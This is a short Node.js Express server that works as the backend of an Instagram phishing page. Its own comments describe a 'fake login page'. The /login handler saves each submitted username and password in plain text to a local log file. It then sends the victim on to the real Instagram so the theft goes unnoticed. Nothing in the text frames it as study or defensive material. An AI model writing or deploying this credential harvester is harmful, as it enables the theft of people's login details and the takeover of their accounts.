const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // To serve the fake login page

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const log = `Username: ${username} | Password: ${password}\n`;
  fs.appendFileSync('log.txt', log);
  res.redirect('https://instagram.com'); // Redirect to real Instagram
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
